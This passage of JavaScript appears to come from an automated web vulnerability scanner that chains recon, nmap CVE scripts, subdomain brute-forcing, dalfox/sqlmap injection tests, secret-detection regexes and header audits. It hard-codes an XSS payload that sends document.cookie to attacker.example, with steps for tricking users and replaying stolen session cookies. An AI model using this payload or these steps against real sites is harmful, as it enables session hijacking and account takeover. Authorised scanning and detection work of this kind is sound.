      { name: 'ftp-anon', args: ['--script', 'ftp-anon', '-p', '21'], cve: null, sev: 'high' },
      { name: 'smb-vuln-ms17-010', args: ['--script', 'smb-vuln-ms17-010', '-p', '445'], cve: 'CVE-2017-0144', sev: 'critical' },
      { name: 'http-shellshock', args: ['--script', 'http-shellshock', '-p', '80,443,8080'], cve: 'CVE-2014-6271', sev: 'critical' },
    ]
    for (const s of scripts) {
      await this.waitIfPaused(scanId)
      try {
        const r = await runNativeTool('nmap-script', `${host} ${s.args.join(' ')}`)
        const out = `${r.stdout || ''}\n${r.stderr || ''}`
        if (/VULNERABLE/i.test(out)) {
          await this.ingestFinding(scanId, {
            title: `${s.name}: target VULNERABLE${s.cve ? ` (${s.cve})` : ''}`,
            severity: s.sev,
            cveId: s.cve,
            cweId: 'CWE-119',
            owaspCategory: 'A06:2021-Vulnerable and Outdated Components',
            description: `nmap NSE script "${s.name}" reports the target is VULNERABLE. This is a scanner-confirmed, remotely exploitable condition.`,
            remediation: 'Patch the affected service immediately; if patching is impossible, isolate the service behind a firewall.',
            module: 'offensive:service-probe',
            evidence: { script: s.name, output: out.split('\n').filter(l => /vulnerab|cve|state/i.test(l)).join('\n').slice(0, 800) },
          }, { verify })
          this.log(scanId, 'info', `⚔️ ${s.name}: VULNERABLE`)
        }
      } catch { /* script unavailable — skip */ }
    }
  }

  /**
   * OFFENSIVE: discover login surfaces (admin panels, auth endpoints) from
   * crawled/fuzzed URLs and flag them as brute-force/hardening targets.
   */
  async _discoverLoginSurfaces(scanId, target, { verify } = {}) {
    const urls = this._urlPool?.get(scanId) ? [...this._urlPool.get(scanId)] : []
    const loginRe = /login|signin|sign-in|auth|admin|wp-login|phpmyadmin|cpanel|webmail|portal|dashboard/i
    const hits = [...new Set(urls.filter(u => loginRe.test(u)))].slice(0, 10)
    if (!hits.length) return
    this.log(scanId, 'info', `⚔️ Login surfaces discovered: ${hits.length}`)
    for (const u of hits) {
      await this.ingestFinding(scanId, {
        title: `Authentication surface exposed — ${u.slice(0, 110)}`,
        severity: 'low',
        cweId: 'CWE-284',
        owaspCategory: 'A07:2021-Identification and Authentication Failures',
        description: `A login/authentication endpoint was discovered at ${u}. It is a candidate for credential attacks (password spraying, default credentials, brute-force) and should enforce MFA, rate-limiting, and lockout.`,
        remediation: 'Enforce MFA, CAPTCHA after N failures, IP-based rate limiting, and strong password policy on all authentication surfaces.',
        module: 'offensive:login-surface',
        evidence: { url: u },
      }, { verify })
    }
  }

  /**
   * OFFENSIVE: cross-reference all collected findings against the offsec
   * payload knowledge base (knowledge/payloads) so every finding gets an
   * attached exploitation payload reference in the report.
   */
  async _matchOffsecPayloads(scanId) {
    try {
      const rows = db.all(`SELECT * FROM findings WHERE scan_id = ?`, scanId)
      let matched = 0
      for (const f of rows) {
        try {
          const enriched = payloadsRag.crossReference({ title: f.title, severity: f.severity, description: f.description })
          if (enriched?.poc && Object.keys(enriched.poc).length) {
            db.run(`UPDATE findings SET poc = ? WHERE id = ?`, JSON.stringify(enriched.poc), f.id)
            matched++
          }
        } catch { /* per-finding */ }
      }
      if (matched) this.log(scanId, 'info', `⚔️ Attached offsec payload references to ${matched} findings (knowledge/payloads)`)
    } catch { /* non-fatal */ }
  }

  /**
   * Scan response bodies of discovered URLs for leaked secrets, tokens,
   * internal IPs, debug info, stack traces, and HTML comments.
   */
  async _scanResponseBodies(scanId, target, { verify } = {}) {
    const urls = this._urlPool?.get(scanId) ? [...this._urlPool.get(scanId)].slice(0, 20) : []
    const base = /^https?:\/\//i.test(target) ? target : `https://${target}`
    if (!urls.includes(base)) urls.unshift(base)

    this.log(scanId, 'info', `🔍 Scanning response bodies for secrets/debug info on ${urls.length} URLs...`)
    for (const url of urls) {
      await this.waitIfPaused(scanId)
      try {
        const res = await fetch(url, { redirect: 'follow', signal: AbortSignal.timeout(8000) })
        const body = (await res.text()).slice(0, 200000)
        const headers = Object.fromEntries(res.headers.entries())
        const bodyLower = body.toLowerCase()

        // API keys / tokens in responses
        const keyPatterns = [
          { re: /(?:api[_-]?key|apikey|access[_-]?token)\s*[:=]\s*['"][A-Za-z0-9_\-+/=]{16,}['"]/gi, label: 'API key in response' },
          { re: /eyJ[a-zA-Z0-9_-]{8,}\.eyJ[a-zA-Z0-9_-]{8,}\.[a-zA-Z0-9_\-]{8,}/g, label: 'JWT token in response' },
          { re: /(?:mongodb|postgres|mysql|redis|amqp):\/\/[^:]+:[^@"'\s]+@/gi, label: 'Database connection string in response' },
          { re: /-----BEGIN (?:RSA |EC |OPENSSH )?PRIVATE KEY-----/g, label: 'Private key in response' },
          { re: /ghp_[a-zA-Z0-9]{30,}/g, label: 'GitHub PAT in response' },
          { re: /sk-[a-zA-Z0-9]{40,}/g, label: 'OpenAI API key in response' },
        ]
        for (const { re, label } of keyPatterns) {
          const matches = body.match(re)
          if (matches?.length) {
            await this.ingestFinding(scanId, {
              title: `${label} (${matches.length} found)`,
              severity: 'critical',
              cweId: 'CWE-200',
              owaspCategory: 'A01:2021-Broken Access Control',
              description: `${label} found in response body at ${url}. This is a critical information disclosure that may allow full compromise.`,
              remediation: 'Never embed secrets in client-side responses. Use server-side env vars and rotate all exposed keys immediately.',
              module: 'response-body-scan',
              evidence: { url, count: matches.length, redacted: matches.slice(0, 3).map(m => `${m.slice(0, 12)}...`) },
            }, { verify })
            this.log(scanId, 'info', `🔍 ${label} — ${matches.length} matches at ${url}`)
          }
        }

        // Internal IP disclosure — skip JS/CSS bundles (SPA bundles contain IP
        // patterns in minified code, source maps, and webpack config)
        const contentType = headers['content-type'] || ''
        const isCodeBundle = /javascript|css|json/i.test(contentType) || /\.(js|css|json|map)$/i.test(url)
        if (!isCodeBundle) {
          const ipMatches = body.match(/(?:10\.\d{1,3}|172\.(?:1[6-9]|2\d|3[01])|192\.168)\.\d{1,3}\.\d{1,3}/g)
          if (ipMatches?.length) {
            await this.ingestFinding(scanId, {
              title: `Internal IP disclosure (${new Set(ipMatches).size} unique)`,
              severity: 'low',
              cweId: 'CWE-200',
              owaspCategory: 'A05:2021-Security Misconfiguration',
              description: `Internal IP addresses found in response body at ${url}: ${[...new Set(ipMatches)].slice(0, 5).join(', ')}. Helps attackers map internal network.`,
              remediation: 'Remove internal IPs from public-facing responses.',
              module: 'response-body-scan',
              evidence: { url, ips: [...new Set(ipMatches)].slice(0, 10) },
            }, { verify })
          }
        }

        // Stack traces / debug info
        if (/stack trace|traceback|at \w+\.\w+:\d+:\d+|Fatal error:/i.test(body) || /<\?php|System\.Exception|rails\.root|django\.debug/i.test(body)) {
          await this.ingestFinding(scanId, {
            title: `Debug/error information exposed in response`,
            severity: 'medium',
            cweId: 'CWE-209',
            owaspCategory: 'A05:2021-Security Misconfiguration',
            description: `Stack trace or debug info found in response at ${url}. Discloses internal paths, framework versions, and code structure.`,
            remediation: 'Disable debug mode and custom error pages in production.',
            module: 'response-body-scan',
            evidence: { url, snippet: body.match(/(?:stack trace|traceback|at \w+\.\w+:\d+:\d+|Fatal error:).{0,200}/i)?.[0]?.slice(0, 300) },
          }, { verify })
        }

        // HTML comments with sensitive content
        const commentMatches = body.match(/<!--[\s\S]*?-->/g)
        if (commentMatches?.length) {
          const sensitive = commentMatches.filter(c => /(?:TODO|FIXME|HACK|password|secret|key|token|admin|api|debug|test|staging|dev|user|email)/i.test(c))
          if (sensitive.length) {
            await this.ingestFinding(scanId, {
              title: `Sensitive information in HTML comments (${sensitive.length} comments)`,
              severity: 'low',
              cweId: 'CWE-615',
              owaspCategory: 'A05:2021-Security Misconfiguration',
              description: `HTML comments at ${url} contain potentially sensitive info: ${sensitive.slice(0, 3).map(c => c.slice(0, 120)).join(' | ')}`,
              remediation: 'Remove sensitive comments from production HTML.',
              module: 'response-body-scan',
              evidence: { url, count: sensitive.length },
            }, { verify })
          }
        }
      } catch { /* skip unreachable */ }
    }
  }

  /**
   * Audit cookie security flags, CORS/ACAO headers, and harvest HTML forms
   * for injection surface enumeration.
   */
  async _auditCookiesCors(scanId, target, { verify } = {}) {
    const base = /^https?:\/\//i.test(target) ? target : `https://${target}`
    this.log(scanId, 'info', `🍪 Auditing cookie security, CORS, and harvesting forms...`)

    try {
      const res = await fetch(base, { redirect: 'follow', signal: AbortSignal.timeout(10000) })
      const headers = Object.fromEntries(res.headers.entries())
      const body = (await res.text()).slice(0, 500000)

      // Cookie security
      const setCookie = headers['set-cookie'] || ''
      if (setCookie) {
        const missingSecure = !/;\s*secure/i.test(setCookie)
        const missingHttpOnly = !/;\s*httponly/i.test(setCookie)
        const missingSameSite = !/;\s*samesite=/i.test(setCookie)
        if (missingSecure || missingHttpOnly || missingSameSite) {
          const issues = []
          if (missingSecure) issues.push('Secure')
          if (missingHttpOnly) issues.push('HttpOnly')
          if (missingSameSite) issues.push('SameSite')
          await this.ingestFinding(scanId, {
            title: `Insecure cookie flags — missing ${issues.join(', ')}`,
            severity: 'medium',
            cweId: 'CWE-614',
            owaspCategory: 'A07:2021-Identification and Authentication Failures',
            description: `Cookies set by ${base} are missing ${issues.join(', ')}. Without Secure, cookies transmit over HTTP. Without HttpOnly, JS can steal them. Without SameSite, CSRF is easier.`,
            remediation: 'Set Secure, HttpOnly, and SameSite=Lax/Strict on all session cookies.',
            module: 'cookie-audit',
            evidence: { url: base, cookie: setCookie.slice(0, 200), missing: issues },
          }, { verify })
        }
      }

      // CORS / Access-Control-Allow-Origin
      // Skip if already emitted by auditHttpBaseline for this scan
      if (!this._corsEmitted) this._corsEmitted = new Set()
      const acao = headers['access-control-allow-origin'] || ''
      const acac = headers['access-control-allow-credentials'] || ''
      if (acao === '*' && !this._corsEmitted.has(scanId)) {
        this._corsEmitted.add(scanId)
        await this.ingestFinding(scanId, {
          title: `CORS: Access-Control-Allow-Origin: *`,
          severity: 'low',
          cweId: 'CWE-942',
          owaspCategory: 'A05:2021-Security Misconfiguration',
          description: `CORS allows any origin (*) at ${base}. While credentials won't be sent, this allows any site to read public API responses.`,
          remediation: 'Restrict ACAO to specific trusted origins. Never use * with credentials.',
          module: 'cors-audit',
          evidence: { url: base, acao, acac },
        }, { verify })
      } else if (acao && acao !== 'null' && acac === 'true' && !this._corsEmitted.has(scanId)) {
        this._corsEmitted.add(scanId)
        await this.ingestFinding(scanId, {
          title: `CORS with credentials enabled — ${acao}`,
          severity: 'medium',
          cweId: 'CWE-942',
          owaspCategory: 'A05:2021-Security Misconfiguration',
          description: `CORS allows origin "${acao}" with credentials at ${base}. If this origin is not fully trusted, it enables cross-origin authenticated requests.`,
          remediation: 'Verify the allowed origin is fully trusted. Prefer explicit origin validation over wildcards.',
          module: 'cors-audit',
          evidence: { url: base, acao, acac },
        }, { verify })
      }

      // Harvest HTML forms for injection surface
      const formMatches = body.match(/<form[\s\S]*?<\/form>/gi)
      if (formMatches?.length) {
        const forms = formMatches.map(f => {
          const action = (f.match(/action\s*=\s*["']([^"']+)["']/i) || [])[1] || ''
          const method = ((f.match(/method\s*=\s*["']([^"']+)["']/i) || [])[1] || 'get').toUpperCase()
          const inputs = [...f.matchAll(/<input[^>]*name\s*=\s*["']([^"']+)["'][^>]*>/gi)].map(m => m[1])
          return { action, method, inputs }
        }).filter(f => f.inputs.length)
        if (forms.length) {
          await this.ingestFinding(scanId, {
            title: `HTML forms discovered — ${forms.length} injection surfaces`,
            severity: 'info',
            cweId: 'CWE-200',
            owaspCategory: 'A03:2021-Injection',
            description: `${forms.length} HTML forms with ${forms.reduce((s,f) => s + f.inputs.length, 0)} input fields found at ${base}. Every form field is a potential injection vector.`,
            remediation: 'Ensure all form inputs are validated and sanitized server-side.',
            module: 'form-harvest',
            evidence: { url: base, forms: forms.slice(0, 5) },
          }, { verify })
          // Queue form actions for injection chaining
          const formUrls = forms.map(f => {
            const action = f.action || base
            const isAbsolute = /^https?:\/\//i.test(action)
            const formUrl = isAbsolute ? action : new URL(action, base).href
            const params = f.inputs.map((n,i) => `${n}=${i+1}`).join('&')
            return `${formUrl}${formUrl.includes('?') ? '&' : '?'}${params}`
          })
          this._collectUrls(scanId, formUrls)
          this.log(scanId, 'info', `🍪 Harvested ${forms.length} forms → ${formUrls.length} parameterized URLs queued`)
        }
      }
    } catch { /* skip unreachable */ }
  }

  /**
   * Injection chaining: take all parameterized URLs discovered during recon,
   * and actively test them with dalfox (XSS) and sqlmap (SQLi).
   */
  async chainInjectionTests(scanId, { verify, targetType, offensive = false } = {}) {
    // Strip URL fragments (#) — SPAs use them client-side; sqlmap/dalfox can't test them
    const urls = this._drainUrls(scanId).map(u => u.split('#')[0]).filter(Boolean)
    const withParams = urls.filter(u => /\?[^=]+=/.test(u))
    let candidates = (withParams.length ? withParams : urls.filter(u => /api|search|query|id=|page=|cat=/i.test(u))).slice(0, 15)
    if (!candidates.length) {
      // Fallback: still probe the base URL with dalfox (DOM/reflective XSS can exist on SPAs)
      const base = (this._currentTarget || '').split('#')[0]
      if (base) {
        this.log(scanId, 'info', '🔗 No parameterized URLs — probing base URL with dalfox only')
        candidates = [base]
      } else {
        this.log(scanId, 'info', '🔗 Injection chaining: no parameterized URLs discovered — skipping')
        return
      }
    } else {
      this.log(scanId, 'info', `🔗 Injection chaining: testing ${candidates.length} parameterized URLs with dalfox + sqlmap`)
    }

    // Chaining spans 70% → 95% (offensive stages continue from 80%).
    const chainStart = 70, chainEnd = 85
    let idx = 0
    for (const url of candidates) {
      await this.waitIfPaused(scanId)
      idx++
      this.progress(scanId, chainStart + (idx / candidates.length) * (chainEnd - chainStart))
      // dalfox (XSS)
      try {
        this.log(scanId, 'info', `  🎯 dalfox → ${url.slice(0, 90)}`)
        const res = await hexstrike.runTool('dalfox', { url, silence: true, format: 'json', env: { PATH: `${process.env.PATH}:/usr/local/bin:/root/go/bin` } })
        const hexOut = res?.success ? `${res.stdout || ''}\n${res.stderr || ''}`.trim() : ''
        const out = hexOut || (await runNativeTool('dalfox', url)).stdout || ''
        if (out) {
          const { findings } = extractFindingsFromOutput('dalfox', out, url)
          for (const f of findings) {
            const stored = await this.ingestFinding(scanId, { ...f, module: `chain:dalfox` }, { verify, targetType })
            // Always attach session-hijack PoC for each confirmed XSS
            if (stored) {
              const pocPayload = `<script>new Image().src='https://attacker.example/c?c='+encodeURIComponent(document.cookie)</script>`
              db.run(`UPDATE findings SET poc = ? WHERE id = ?`, JSON.stringify({
                type: 'session-hijack',
                payload: pocPayload,
                impact: 'Injects a beacon that exfiltrates the victim session cookie to an attacker-controlled host, enabling full account takeover when the XSS fires in an authenticated browser.',
                steps: [
                  'Host a listener (e.g. https://webhook.site or burp collaborator) as the exfil endpoint',
                  `Inject the payload into the vulnerable parameter of ${url}`,
                  'Trick an authenticated user into visiting the injected URL',
                  'Replay the captured session cookie to hijack the account',
                ],
              }), stored.id)
              this.log(scanId, 'info', `⚔️ Attached session-hijack PoC to XSS finding on ${url.slice(0, 80)}`)
            }
          }
        }
      } catch (e) { this.log(scanId, 'warn', `  dalfox chaining error: ${e.message}`) }

      await this.waitIfPaused(scanId)
      // sqlmap only makes sense when the URL actually carries query parameters
      if (/\?[^=]+=/.test(url)) {
        try {
          this.log(scanId, 'info', `  🎯 sqlmap → ${url.slice(0, 90)}`)
          const res = await hexstrike.runTool('sqlmap', { url, batch: true, level: 3, risk: 2, smart: true, forms: true })
          const hexOut = res?.success ? `${res.stdout || ''}\n${res.stderr || ''}`.trim() : ''
          const out = hexOut || (await runNativeTool('sqlmap', url)).stdout || ''
          if (out) {
            const { findings } = extractFindingsFromOutput('sqlmap', out, url)
            for (const f of findings) {
              await this.ingestFinding(scanId, { ...f, module: `chain:sqlmap` }, { verify, targetType })
            }
          }
        } catch (e) { this.log(scanId, 'warn', `  sqlmap chaining error: ${e.message}`) }
      }
    }
  }

  /** Quick WordPress fingerprint — used to skip wpscan on non-WP targets. */
  async _isWordPress(target) {
    const url = /^https?:\/\//i.test(target) ? target : `https://${target}`
    try {
      const res = await fetch(url, { method: 'GET', redirect: 'follow', signal: AbortSignal.timeout(10000) })
      const body = (await res.text()).slice(0, 500000)
      return /wp-content|wp-includes|wp-json|wordpress/i.test(body)
    } catch {
      return false
    }
  }

  /**
   * Subdomain discovery: passive (subfinder/amass via hexstrike/native) then
   * active DNS brute-force (gobuster dns). Wildcard DNS results are filtered by
   * comparing against a random non-existent subdomain.
   * Each live subdomain is then probed for Swagger/OpenAPI docs.
   */
  async _runSubdomainDiscovery(scanId, target, { verify } = {}) {
    const host = (() => {
      try { return new URL(/^https?:\/\//i.test(target) ? target : `https://${target}`).hostname }
      catch { return target.replace(/^https?:\/\//i, '').split('/')[0] }
    })()
    const rootDomain = host.split('.').slice(-2).join('.')   // www.myces-fms.com → myces-fms.com
    if (!rootDomain || !rootDomain.includes('.')) return

    this.log(scanId, 'info', `🔎 Enumerating subdomains for ${rootDomain} (passive + brute-force)...`)
    const subs = new Set()

    // Passive: subfinder
    try {
      const r = await runNativeTool('subfinder', rootDomain)
      for (const line of (r.stdout || '').split('\n')) {
        const h = line.trim().toLowerCase()
        if (/^[a-z0-9.-]+\.[a-z]{2,}$/.test(h) && h.endsWith(rootDomain)) subs.add(h)
      }
    } catch { /* optional */ }

    // Active: gobuster dns brute-force (with wildcard filter)
    // Use the ROOT domain (e.g., edu.my) not the full host
    try {
      const probe = await runNativeTool('dnsbrute', `nonexistent-${randomUUID().slice(0, 8)}.${rootDomain}`)
      const wildcardIps = new Set((probe.stdout || '').split('\n').map(l => l.trim()).filter(l => /^\d+\.\d+\.\d+\.\d+$/.test(l)))
      const brute = await runNativeTool('dnsbrute', rootDomain)
      for (const line of (brute.stdout || '').split('\n')) {
        const m = line.match(/([a-z0-9.-]+\.[a-z]{2,})/i)
        if (m && m[1].toLowerCase().endsWith(rootDomain)) {
          // skip wildcard-only matches: gobuster prints "Found: host" lines; keep simple
          subs.add(m[1].toLowerCase())
        }
      }
    } catch { /* optional */ }

    if (!subs.size) {
      this.log(scanId, 'info', '🔎 No additional subdomains discovered')
    } else {
      const subList = [...subs].sort()
      // ── Track subdomains in blackboxMeta ──
      const meta = this._blackboxMeta?.get(scanId)
      if (meta) {
        meta.subdomains = subList.slice(0, 200)
        try { db.run(`UPDATE scans SET blackbox_meta = ? WHERE id = ?`, JSON.stringify(meta), scanId) } catch { /* non-fatal */ }
      }
      this.log(scanId, 'info', `🔎 Discovered ${subs.size} subdomains: ${[...subs].slice(0, 10).join(', ')}${subs.size > 10 ? '…' : ''}`)
      // ONE consolidated finding instead of N individual spam findings
      await this.ingestFinding(scanId, {
        title: `Subdomain enumeration — ${subs.size} subdomains discovered`,
        severity: 'info',
        cweId: 'CWE-200',
        owaspCategory: 'A05:2021-Security Misconfiguration',
        description: `DNS enumeration discovered ${subs.size} subdomains for ${rootDomain}. Each subdomain expands the attack surface and should be inventoried. Subdomains: ${subList.join(', ')}`,
        remediation: 'Ensure all subdomains are inventoried and decommission unused ones. Review each for security posture.',
        module: 'subdomain-enum',
        evidence: { rootDomain, count: subs.size, subdomains: subList.slice(0, 50) },
      }, { verify })
    }

    // Probe main target + top subdomains for Swagger / OpenAPI docs
    const hostsToProbe = [host, ...subs].slice(0, 5)
    let swaggerHits = 0
    for (const h of hostsToProbe) {
      await this.waitIfPaused(scanId)
      const hit = await this._probeApiDocs(scanId, h, { verify })
      if (hit) swaggerHits++
    }

    // ── SUBDOMAIN SCAN CASCADE: scan top subdomains for HTTP headers + sensitive paths ──
    // This is what turns 15477 discovered subdomains into actual findings
    if (subs.size > 0) {
      const topSubs = [...subs].slice(0, 50) // top 50 by discovery order
      this.log(scanId, 'info', `🔎 Cascading baseline scan to ${topSubs.length} subdomains...`)
      let scanned = 0
      for (const sub of topSubs) {
        await this.waitIfPaused(scanId)
        try {
          await this.auditHttpBaseline(scanId, sub, { verify, targetType: 'url' })
          scanned++
          this.progress(scanId, 8 + (scanned / topSubs.length) * 4)
        } catch { /* skip dead subdomains */ }
      }
      if (scanned > 0) {
        this.log(scanId, 'info', `🔎 Subdomain cascade complete: ${scanned}/${topSubs.length} subdomains audited`)
      }
    }
  }

  /**
   * Probe a host for Swagger/OpenAPI documentation. If found, record a finding
   * and feed every parameterized endpoint into the injection-chaining pool.
   */
  async _probeApiDocs(scanId, host, { verify } = {}) {
    const candidates = []
    for (const scheme of ['https', 'http']) {
      for (const p of ['/swagger-ui.html', '/swagger-ui/', '/api-docs', '/v2/api-docs', '/v3/api-docs', '/openapi.json', '/swagger.json', '/api/swagger-ui.html']) {
        candidates.push(`${scheme}://${host}${p}`)
      }
    }
    for (const url of candidates) {
      try {
        const res = await fetch(url, { redirect: 'follow', signal: AbortSignal.timeout(1500) })
        if (!res.ok) continue
        const body = (await res.text()).slice(0, 2_000_000)
        const isJsonSpec = /"swagger"\s*:|"openapi"\s*:/.test(body)
        const isSwaggerUi = /swagger-ui|SwaggerUIBundle/i.test(body)
        if (!isJsonSpec && !isSwaggerUi) continue

        const title = isJsonSpec ? 'Exposed OpenAPI/Swagger Specification' : 'Exposed Swagger UI'
        await this.ingestFinding(scanId, {
          title: `${title} — ${url}`,
          severity: 'medium',
          cweId: 'CWE-200',
          owaspCategory: 'A05:2021-Security Misconfiguration',
          description: `API documentation is publicly accessible at ${url}. This discloses the full API surface (endpoints, parameters, auth schemes) to attackers.`,
          remediation: 'Restrict access to API documentation (auth, IP allowlist) in production.',
          module: 'api-discovery',
          evidence: { url, spec: isJsonSpec },
        }, { verify })
        this.log(scanId, 'info', `📋 ${title} at ${url}`)

        // If it's the raw spec, extract parameterized endpoints for chaining
        if (isJsonSpec) {
          try {
            const spec = JSON.parse(body)
            const basePath = spec.basePath || (spec.servers?.[0]?.url || '')
            const base = `${new URL(url).origin}${basePath}`.replace(/\/$/, '')
            const endpoints = []
            for (const [path, ops] of Object.entries(spec.paths || {})) {
              const full = `${base}${path}`
              const params = []
              for (const op of Object.values(ops || {})) {
                for (const prm of (op.parameters || [])) {
                  if (prm.in === 'query' && prm.name) params.push(prm.name)
                }
              }
              if (params.length) {
                endpoints.push(`${full}?${[...new Set(params)].slice(0, 3).map(n => `${n}=1`).join('&')}`)
              }
              if (/\{[^}]+\}/.test(path)) {
                endpoints.push(full.replace(/\{[^}]+\}/g, '1'))
              }
            }
            if (endpoints.length) {
              this._collectUrls(scanId, endpoints.slice(0, 30))
              this.log(scanId, 'info', `📋 Extracted ${endpoints.length} API endpoints from spec → queued for injection testing`)
            }
          } catch { /* malformed spec */ }
        }
        return // one hit per host is enough
      } catch { /* try next */ }
    }
    return false // no hit
  }

  async processSmartScanResults(scanId, res, opts) {
    const tools = res.tools_executed || []
    this.log(scanId, 'info', `Smart scan executed ${tools.length} tools; ${res.total_vulnerabilities || 0} raw indicators`)
    for (const t of tools) {
      await this.processToolOutput(scanId, t.tool, { success: t.status === 'success', stdout: t.stdout, stderr: t.stderr }, opts)
    }
  }

  async runNativeBlackbox(scan, { verify = true, modules = [] } = {}) {
    const scanId = scan.id
    const target = scan.target
    this._currentTarget = target
    this.log(scanId, 'info', `⚡ Running Native Scanner Engine on ${target}...`)

    // ── Blackbox metadata tracking (mirrors whiteboxMeta for UI) ──
    const meta = {
      startTime: new Date().toISOString(),
      urls: [/^https?:\/\//i.test(target) ? target : `https://${target}`],
      tools: [],
      subdomains: [],
      endpoints: [],
      target,
    }
    this._blackboxMeta.set(scanId, meta)
    const _saveMeta = () => {
      try {
        const m = this._blackboxMeta.get(scanId)
        if (m) db.run(`UPDATE scans SET blackbox_meta = ? WHERE id = ?`, JSON.stringify(m), scanId)
      } catch { /* non-fatal */ }
    }
    const _addUrl = (url) => {
      if (!url || typeof url !== 'string') return
      const u = url.replace(/#.*$/, '').trim()
      if (!u || u.length < 5) return
      if (!meta.urls.includes(u)) {
        meta.urls.push(u)
        if (meta.urls.length > 500) meta.urls = meta.urls.slice(-500)
      }
    }
    const origCollectUrls = this._collectUrls.bind(this)
    this._collectUrls = (sid, urls) => {
      origCollectUrls(sid, urls)
      if (sid === scanId && Array.isArray(urls)) {
        for (const u of urls) _addUrl(u)
      }
    }
    _saveMeta()

    // Always run baseline headers + sensitive paths
    await this.auditHttpBaseline(scanId, target, { verify, targetType: scan.target_type })
    this.progress(scanId, 12)

    // Subdomain discovery
    if (/^https?:\/\//i.test(target) || !/\//.test(target)) {
      await this._runSubdomainDiscovery(scanId, target, { verify })
    }
    this.progress(scanId, 25)

    // Run native tools in parallel batches (bounded concurrency, like auditCode)
    // Default: full offensive stack — recon (nmap, whatweb, wafw00f), web crawl (katana, ffuf, gobuster),
    // vuln scan (nuclei, nikto), parameter discovery (arjun), XSS probe (dalfox), tech (sslscan, wpscan).
    const tools = modules.length ? modules : ['nmap', 'whatweb', 'wafw00f', 'nikto', 'ffuf', 'gobuster', 'katana', 'nuclei', 'arjun', 'dalfox', 'wpscan']
    const uniqueTools = [...new Set(tools)]
    const CONCURRENCY = Math.min(config.scan.maxConcurrency || 3, uniqueTools.length)
    let toolCursor = 0
    let completedTools = 0

    this.log(scanId, 'info', `🔀 Running ${uniqueTools.length} native tools with ${CONCURRENCY} parallel workers`)

    const toolWorker = async (workerId) => {
      const wid = workerId + 1
      while (toolCursor < uniqueTools.length) {
        const idx = toolCursor++
        const tool = uniqueTools[idx]
        await this.waitIfPaused(scanId)
        const t0 = Date.now()
        this.log(scanId, 'info', `  ├─ T${wid} ▶ ${tool}`)
        try {
          const res = await runNativeTool(tool, target)
          const ms = Date.now() - t0
          const status = await this.processToolOutput(scanId, tool, res, { verify, targetType: scan.target_type })
          this.log(scanId, 'info', `  │  T${wid} ✅ ${tool} completed (${(ms / 1000).toFixed(1)}s)`)
          completedTools++
          this.progress(scanId, 25 + (completedTools / uniqueTools.length) * 35)
        } catch (e) {
          const ms = Date.now() - t0
          this.log(scanId, 'warn', `  │  T${wid} ⚠️ ${tool} failed: ${e.message} (${(ms / 1000).toFixed(1)}s)`)
          completedTools++
          this.progress(scanId, 25 + (completedTools / uniqueTools.length) * 35)
        }
      }
    }

    await Promise.all(Array.from({ length: CONCURRENCY }, (_, i) => toolWorker(i)))
    this.log(scanId, 'info', `🔀 Native tools complete: ${completedTools}/${uniqueTools.length} tools finished`)

    // Injection chaining (dalfox/sqlmap on discovered URLs)
    await this.chainInjectionTests(scanId, { verify, targetType: scan.target_type, offensive: true })
    this.progress(scanId, 65)

    // Service-level CVE probing (nmap NSE scripts on open ports)
    await this._probeServiceVulns(scanId, target, { verify })
    this.progress(scanId, 68)

    // Advanced attack vectors (SSTI, XXE, CSRF, JWT, GraphQL, Host Header, etc.)
    await this._probeAdvancedAttackVectors(scanId, target, { verify })
    this.progress(scanId, 76)

    // Login surface discovery (admin panels, default creds)
    await this._discoverLoginSurfaces(scanId, target, { verify })
    this.progress(scanId, 80)

    // OffSec payload matching against discovered endpoints
    await this._matchOffsecPayloads(scanId)
    this.progress(scanId, 84)

    // Response body scanning
    await this._scanResponseBodies(scanId, target, { verify })
    this.progress(scanId, 90)

    // Cookie + CORS audit
    await this._auditCookiesCors(scanId, target, { verify })
    this.progress(scanId, 95)

    this.finish(scanId, 'completed')
  }

  /**
   * Baseline web audit: HTTP security headers + common sensitive paths.
   * Always executed for URL targets — engine-agnostic and high-signal.
   */
  async auditHttpBaseline(scanId, target, { verify, targetType = 'url' } = {}) {
    const targetUrl = /^https?:\/\//i.test(target) ? target : `https://${target}`

    // Deduplicate across multiple auditHttpBaseline calls (main target + subdomains)
    if (!this._headerAudited) this._headerAudited = new Map()
    const audited = this._headerAudited.get(scanId) || new Set()
    this._headerAudited.set(scanId, audited)
    const isFirstAudit = !audited.has('__any__')
    audited.add(targetUrl)
    audited.add('__any__')

    // 1. Audit HTTP Security Headers (only emit ONCE per scan, not per subdomain)
    if (!isFirstAudit) {
      this.log(scanId, 'info', `⏭ Skipping duplicate header audit for ${targetUrl} (already audited primary target)`)
    }
    try {
      this.log(scanId, 'info', `▶ Auditing Security Headers on ${targetUrl}...`)
      let res
      try {
        res = await fetch(targetUrl, { method: 'HEAD', redirect: 'follow', signal: AbortSignal.timeout(15000) })
      } catch {
        try { res = await fetch(targetUrl, { method: 'GET', signal: AbortSignal.timeout(15000) }) } catch { res = null }
      }
      if (res && res.headers) {
        const headers = Object.fromEntries(res.headers.entries())
        const missing = []
        if (!headers['strict-transport-security']) missing.push('Strict-Transport-Security (HSTS)')
        if (!headers['content-security-policy']) missing.push('Content-Security-Policy (CSP)')
        if (!headers['x-frame-options']) missing.push('X-Frame-Options')
        if (!headers['x-content-type-options']) missing.push('X-Content-Type-Options')
        if (!headers['referrer-policy']) missing.push('Referrer-Policy')
        if (!headers['permissions-policy']) missing.push('Permissions-Policy')
        if (missing.length) {
          const sev = missing.some(m => m.startsWith('Content-Security') || m.startsWith('X-Frame')) ? 'medium' : 'low'
          await this.ingestFinding(scanId, {
            title: `Missing Security Headers (${missing.length})`,
            severity: sev,
            cweId: 'CWE-693',
            owaspCategory: 'A05:2021-Security Misconfiguration',
            description: `The target ${targetUrl} is missing ${missing.length} recommended HTTP security headers: ${missing.join(', ')}. This weakens defenses against clickjacking, MIME-sniffing, and XSS.`,
            remediation: 'Configure the web server to send: Strict-Transport-Security, Content-Security-Policy, X-Frame-Options, X-Content-Type-Options, Referrer-Policy, Permissions-Policy.',
            module: 'http-headers',
            evidence: { url: targetUrl, missing, present: Object.keys(headers) },
          }, { verify })
        }
        if (headers['server']) {
          await this.ingestFinding(scanId, {
            title: `Server Header Information Disclosure (${headers['server']})`,
            severity: 'info',
            cweId: 'CWE-200',
            owaspCategory: 'A05:2021-Security Misconfiguration',
            description: `The server advertises banner details: ${headers['server']}`,
            remediation: 'Suppress or obfuscate the Server HTTP header.',
            module: 'http-headers',
            evidence: { url: targetUrl, server: headers['server'] },
          }, { verify })
        }
      }
    } catch (err) {
